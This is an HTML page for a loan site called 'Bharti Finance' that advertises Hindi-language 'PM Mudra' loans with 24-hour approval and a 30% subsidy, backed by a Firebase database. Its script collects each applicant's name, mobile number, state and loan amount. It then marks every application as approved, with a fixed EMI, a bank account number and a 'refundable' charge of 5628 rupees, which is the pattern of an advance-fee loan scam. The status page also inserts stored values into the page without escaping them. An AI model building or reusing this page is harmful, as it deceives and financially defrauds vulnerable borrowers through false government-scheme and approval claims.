<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bharti Finance - Aapka Bharosa</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>

    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f7f6; margin: 0; padding: 0; text-align: center; color: #333; }
        
        .sidenav { height: 100%; width: 0; position: fixed; z-index: 10000; top: 0; right: 0; background-color: #d32f2f; overflow-x: hidden; transition: 0.5s; padding-top: 60px; text-align: left; }
        .sidenav a { padding: 15px 30px; text-decoration: none; font-size: 20px; color: white; display: block; border-bottom: 1px solid #b71c1c; }
        .sidenav .closebtn { position: absolute; top: 10px; right: 25px; font-size: 40px; color: white; cursor: pointer; }

        .header { background: white; padding: 10px 20px; border-bottom: 5px solid #d32f2f; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 5000; height: 70px; }
        .logo-box h1 { color: #d32f2f; margin: 0; font-size: 28px; font-weight: 900; line-height: 1; text-transform: uppercase; }
        .logo-box p { color: #333; margin: 0; font-weight: bold; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
        .menu-btn { font-size: 30px; background: #d32f2f; color: white; width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; border: none; }

        /* Slider Styles */
        .slider-container { position: relative; margin: 15px; border-radius: 20px; overflow: hidden; border: 4px solid white; box-shadow: 0 8px 20px rgba(0,0,0,0.15); height: 220px; background: #eee; }
        .slider-img { width: 100%; height: 100%; object-fit: cover; display: none; }
        .slider-img.active { display: block; }
        .slider-btn { position: absolute; top: 50%; transform: translateY(-50%); background: rgba(0,0,0,0.5); color: white; border: none; padding: 10px 15px; cursor: pointer; font-size: 20px; border-radius: 5px; z-index: 10; }
        .prev { left: 10px; }
        .next { right: 10px; }

        .vision-box { background: #d32f2f; color: white; margin: 15px; padding: 25px; border-radius: 20px; }
        .card { background: white; margin: 15px; padding: 25px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-top: 5px solid #d32f2f; }
        input, select { width: 92%; padding: 15px; margin: 10px 0; border: 1px solid #ccc; border-radius: 12px; font-size: 16px; outline: none; background: #fff; }
        .btn-red { width: 100%; background: #d32f2f; color: white; padding: 16px; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; }
        .btn-dark { width: 100%; background: #333; color: white; padding: 16px; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; }

        /* Dashboard Styles - Right Aligned */
        .status-table { margin-top: 20px; display: none; background: #fff; border-radius: 20px; overflow: hidden; border: 2px solid #d32f2f; text-align: left; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        .status-head { background: #d32f2f; color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 22px; }
        .status-body { padding: 20px; }
        .photo-frame { width: 180px; height: 200px; margin: 10px auto 20px; border: 3px solid #d32f2f; border-radius: 10px; overflow: hidden; display: flex; align-items: center; justify-content: center; background: #f9f9f9; }
        .photo-frame img { width: 100%; height: 100%; object-fit: cover; }
        .info-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #eee; font-size: 16px; align-items: center; }
        .info-row span:first-child { font-weight: bold; color: #222; text-transform: lowercase; }
        .info-row span:last-child { color: #555; text-align: right; flex: 1; margin-left: 15px; }
        .approved-bar { background: #388e3c; color: white; padding: 15px; text-align: center; font-weight: 900; font-size: 22px; border-radius: 10px; margin-top: 15px; }

        /* Banner Images Above Hindi Matter */
        .new-banner { margin: 10px 15px; border-radius: 15px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.1); border: 1px solid #ddd; }
        .new-banner img { width: 100%; display: block; }

        .hindi-matter { background: white; margin: 15px; padding: 20px; border-radius: 20px; border: 2px solid #d32f2f; text-align: left; line-height: 1.7; }
        .subsidy-box { background: #ffeb3b; padding: 15px; border-radius: 12px; font-weight: bold; text-align: center; margin: 15px 0; border: 2px dashed #000; }
        .footer { background: #1a1a1a; color: white; padding: 40px 25px; margin-top: 30px; }
    </style>
</head>
<body>

    <div id="mySidenav" class="sidenav">
        <span class="closebtn" onclick="closeNav()">&times;</span>
        <a href="javascript:void(0)" onclick="closeNav()">üè† ‡§π‡•ã‡§Æ</a>
        <a href="#applySection" onclick="closeNav()">üìù ‡§≤‡•ã‡§® ‡§Ö‡§™‡•ç‡§≤‡§æ‡§à</a>
        <a href="#statusSection" onclick="closeNav()">üîç ‡§∏‡•ç‡§ü‡•á‡§ü‡§∏ ‡§ö‡•á‡§ï</a>
    </div>

    <div class="header">
        <div class="logo-box"><h1>BHARTI</h1><p>FINANCE SERVICES</p></div>
        <div class="menu-btn" onclick="openNav()">‚ò∞</div>
    </div>

    <div class="slider-container">
        <button class="slider-btn prev" onclick="changeSlide(-1)">&#10094;</button>
        <img src="https://i.ibb.co/XZTmf5wC/Screenshot-20240908-211047-Samsung-Internet.jpg" class="slider-img active">
        <img src="https://i.ibb.co/m5W0LrDS/Screenshot-20260224-174731-Samsung-Internet.jpg" class="slider-img">
        <img src="https://i.ibb.co/b5kBBsfw/Screenshot-20260224-174630-Samsung-Internet.jpg" class="slider-img">
        <button class="slider-btn next" onclick="changeSlide(1)">&#10095;</button>
    </div>

    <div class="vision-box">
        <h2>Bharti Pm Mudra Loan</h2>
        <p>"‡§≠‡§æ‡§∞‡§§ ‡§ï‡•á ‡§π‡§∞ ‡§®‡§æ‡§ó‡§∞‡§ø‡§ï ‡§ï‡•ã ‡§Ü‡§∏‡§æ‡§® ‡§î‡§∞ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ã‡§£ ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§®‡§æ ‡§π‡§Æ‡§æ‡§∞‡•Ä ‡§™‡•ç‡§∞‡§æ‡§•‡§Æ‡§ø‡§ï‡§§‡§æ ‡§π‡•à‡•§"</p>
    </div>

    <div class="card" id="applySection">
        <h3 style="color: #d32f2f; text-align: left;">üìù Apply Online</h3>
        <input type="text" id="n" placeholder="Customer Name">
        <input type="number" id="m" placeholder="Mobile Number">
        
        
<select id="loan_state" style="width: 100% !important; height: 55px !important; min-height: 55px !important; background-color: #f1f4f9 !important; border: 1px solid #ced4da !important; border-radius: 12px !important; margin-bottom: 15px !important; padding: 0 15px !important; font-size: 16px !important; color: #333 !important; display: block !important; -webkit-appearance: none !important; -moz-appearance: none !important; appearance: none !important; background-image: url('data:image/svg+xml;charset=UTF-8,%3csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22 fill=%22none%22 stroke=%22%23333%22 stroke-width=%222%22 stroke-linecap=%22round%22 stroke-linejoin=%22round%22%3e%3cpolyline points=%226 9 12 15 18 9%22%3e%3c/polyline%3e%3c/svg%3e') !important; background-repeat: no-repeat !important; background-position: right 15px center !important; background-size: 15px !important;">
    <option value="">Select State / UT</option>
    <option value="Andaman and Nicobar Islands">Andaman and Nicobar Islands</option>
    <option value="Andhra Pradesh">Andhra Pradesh</option>
    <option value="Arunachal Pradesh">Arunachal Pradesh</option>
    <option value="Assam">Assam</option>
    <option value="Bihar">Bihar</option>
    <option value="Chandigarh">Chandigarh</option>
    <option value="Chhattisgarh">Chhattisgarh</option>
    <option value="Dadra and Nagar Haveli and Daman and Diu">Dadra and Nagar Haveli and Daman and Diu</option>
    <option value="Delhi">Delhi</option>
    <option value="Goa">Goa</option>
    <option value="Gujarat">Gujarat</option>
    <option value="Haryana">Haryana</option>
    <option value="Himachal Pradesh">Himachal Pradesh</option>
    <option value="Jammu and Kashmir">Jammu and Kashmir</option>
    <option value="Jharkhand">Jharkhand</option>
    <option value="Karnataka">Karnataka</option>
    <option value="Kerala">Kerala</option>
    <option value="Ladakh">Ladakh</option>
    <option value="Lakshadweep">Lakshadweep</option>
    <option value="Madhya Pradesh">Madhya Pradesh</option>
    <option value="Maharashtra">Maharashtra</option>
    <option value="Manipur">Manipur</option>
    <option value="Meghalaya">Meghalaya</option>
    <option value="Mizoram">Mizoram</option>
    <option value="Nagaland">Nagaland</option>
    <option value="Odisha">Odisha</option>
    <option value="Puducherry">Puducherry</option>
    <option value="Punjab">Punjab</option>
    <option value="Rajasthan">Rajasthan</option>
    <option value="Sikkim">Sikkim</option>
    <option value="Tamil Nadu">Tamil Nadu</option>
    <option value="Telangana">Telangana</option>
    <option value="Tripura">Tripura</option>
    <option value="Uttar Pradesh">Uttar Pradesh</option>
    <option value="Uttarakhand">Uttarakhand</option>
    <option value="West Bengal">West Bengal</option>
</select>


        <input type="number" id="a" placeholder="Loan Amount (Min. 100000)">
        <button class="btn-red" onclick="saveData()">SUBMIT APPLICATION</button>
    </div>

    <div class="card" id="statusSection">
        <h3 style="color:#333">üîç Track Status</h3>
        <input type="number" id="sm" placeholder="‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞‡•ç‡§° ‡§Æ‡•ã‡§¨‡§æ‡§á‡§≤ ‡§®‡§Ç‡§¨‡§∞ ‡§°‡§æ‡§≤‡•á‡§Ç">
        <button class="btn-dark" onclick="checkStatus()">CHECK STATUS</button>
        <div id="res" class="status-table"></div>
    </div>

    <div class="new-banner"><img src="https://i.ibb.co/7dHQ1XsX/Screenshot-20260123-193029-Samsung-Internet.jpg"></div>
 
    <div class="new-banner"><img src="https://i.ibb.co/mV9B1NLs/Screenshot-20260123-193632-Samsung-Internet.jpg"></div>

    <div class="hindi-matter">
        <p>üìå ‡§≤‡•ã‡§® ‡§≤‡•á‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§ú ‡§π‡•Ä <b>Apply</b> ‡§ï‡§∞‡•á‡§Ç‡•§ ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú: <b>‡§Ü‡§ß‡§æ‡§∞ ‡§ï‡§æ‡§∞‡•ç‡§° ‡§î‡§∞ ‡§™‡•à‡§® ‡§ï‡§æ‡§∞‡•ç‡§°</b>‡•§</p>
        <p>‚ö° ‡§Æ‡§æ‡§§‡•ç‡§∞ <b>24 ‡§ò‡§Ç‡§ü‡•á</b> ‡§Æ‡•á‡§Ç ‡§≤‡•ã‡§® ‡§Ö‡§™‡•ç‡§∞‡•Ç‡§µ‡§≤ ‡§™‡§æ‡§è‡§Ç‡•§</p>
        <div class="subsidy-box">üí∞ 30% ‡§ï‡•Ä ‡§∏‡§¨‡•ç‡§∏‡§ø‡§°‡•Ä!</div>
    </div>

    <div class="footer">
        <h3>üè¢ Registered Address:</h3>
        <p>B/23, Inner Circle, Connaught Place, <br><b>New Delhi, 110001</b></p>
    </div>

        <script>
        function openNav() { document.getElementById("mySidenav").style.width = "280px"; }
        function closeNav() { document.getElementById("mySidenav").style.width = "0"; }

        // Slider Logic
        let currentSlide = 0;
        const slides = document.querySelectorAll(".slider-img");
        function changeSlide(n) {
            slides[currentSlide].classList.remove("active");
            currentSlide = (currentSlide + n + slides.length) % slides.length;
            slides[currentSlide].classList.add("active");
        }
        setInterval(() => changeSlide(1), 5000);

        // Firebase Config (Aapka Bharti Config)
        const firebaseConfig = {
            apiKey: "AIzaSyAzdiBUqO6AvuQmM7HZSFbPJ_fQZuiGu8E",
            authDomain: "bharti-finan-e.firebaseapp.com",
            databaseURL: "https://bharti-finan-e-default-rtdb.firebaseio.com",
            projectId: "bharti-finan-e",
            storageBucket: "bharti-finan-e.firebasestorage.app",
            messagingSenderId: "448784982605",
            appId: "1:448784982605:web:fdfc19859cfb20ea02f204"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // FIXED SAVE DATA FUNCTION
        function saveData() {
            // IDs matched with your HTML (n, m, loan_state, a)
            const name = document.getElementById('n').value;
            const mobile = document.getElementById('m').value;
            const state = document.getElementById('loan_state').value; // Yahan galti thi, ab theek hai
            const amount = document.getElementById('a').value;

            if(!name || mobile.length < 10 || !state || !amount) { 
                alert("‚ö†Ô∏è Kripya saari details sahi se bharein!"); 
                return; 
            }
            
            if(parseInt(amount) < 100000) { 
                alert("‚ùå Bharti Finance sirf ‚Çπ1,00,000 ya usse zyada ka loan deta hai."); 
                return; 
            }

            db.ref('bharti_loans/' + mobile).set({ 
                name: name, 
                state: state, 
                amount: amount + " RS.", 
                app_by: "PMGEP LOAN DEPARTMENT", 
                date: "25/02/2026", 
                branch: "NEW DELHI HO", 
                type: "PERSONAL LOAN", 
                tenure: "3 YEARS", 
                emi: "3125/- RS. PER MONTH", 
                p_status: "SUCCESSFUL", 
                acc: "04663211000679 UCO BANK", 
                issue: "NONE", 
                charges: "5628/- REFUNDABLE AMOUNT", 
                status: "APPROVED", 
                photo: "https://i.ibb.co/hK5KqN3M/1000101005.jpg" 
            }).then(() => { 
                alert("‚úÖ Application Submitted Successfully!"); 
                location.reload(); 
            }).catch((e) => {
                alert("Error: " + e.message);
            });
        }

        function checkStatus() {
            const mobile = document.getElementById('sm').value;
            const out = document.getElementById('res');
            if(!mobile) { alert("Please enter mobile number"); return; }
            db.ref('bharti_loans/' + mobile).once('value').then((snap) => {
                out.style.display = "block";
                if(snap.exists()){
                    const d = snap.val();
                    let photoHtml = (d.photo && d.photo.includes("http")) ? `<div class="photo-frame"><img src="${d.photo}"></div>` : `<div class="photo-frame"><span style="color:#999">No Photo</span></div>`;
                    out.innerHTML = `
                        <div class="status-head">Status Details</div>
                        <div class="status-body">
                            ${photoHtml}
                            <div class="info-row"><span>mobile:</span> <span>${mobile}</span></div>
                            <div class="info-row"><span>customer name:</span> <span>${d.name}</span></div>
                            <div class="info-row"><span>loan amount:</span> <span>${d.amount}</span></div>
                            <div class="info-row"><span>approved by:</span> <span>${d.app_by}</span></div>
                            <div class="info-row"><span>approval date:</span> <span>${d.date}</span></div>
                            <div class="info-row"><span>branch:</span> <span>${d.branch}</span></div>
                            <div class="info-row"><span>loan type:</span> <span>${d.type}</span></div>
                            <div class="info-row"><span>tenure:</span> <span>${d.tenure}</span></div>
                            <div class="info-row"><span>emi:</span> <span>${d.emi}</span></div>
                            <div class="info-row"><span>payment status:</span> <span>${d.p_status}</span></div>
                            <div class="info-row"><span>account number:</span> <span>${d.acc}</span></div>
                            <div class="info-row"><span>issue:</span> <span>${d.issue}</span></div>
                            <div class="info-row"><span>charges:</span> <span>${d.charges}</span></div>
                            <div class="approved-bar">${d.status}</div>
                        </div>`;
                } else { out.innerHTML = "<p style='padding:20px; color:red; font-weight:bold;'>Record Not Found!</p>"; }
            });
        }
    </script>

</body>
</html>
